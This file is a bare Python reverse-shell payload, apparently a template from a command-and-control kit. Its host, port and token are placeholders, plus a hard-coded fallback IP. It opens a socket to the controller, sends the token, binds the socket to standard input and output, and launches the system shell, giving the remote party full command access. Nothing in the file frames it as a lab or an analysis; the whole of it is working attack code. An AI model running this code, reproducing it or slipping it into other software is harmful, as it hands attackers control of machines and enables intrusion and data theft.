import socket, os, subprocess, sys, time

HOSTS = ["__C2_RS_HOST__", "__C2_RS_HOST__"]
PORT = __C2_RS_PORT__
TOKEN = "__C2_TOKEN__"

if HOSTS[0].startswith("t"):
    HOSTS.append("192.168.100.82")

for host in HOSTS:
    try:
        s = socket.socket()
        s.settimeout(10)
        s.connect((host, PORT))
        s.send((TOKEN + "\n").encode())
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call([os.environ.get("SHELL", "/bin/sh")])
        break
    except Exception:
        continue
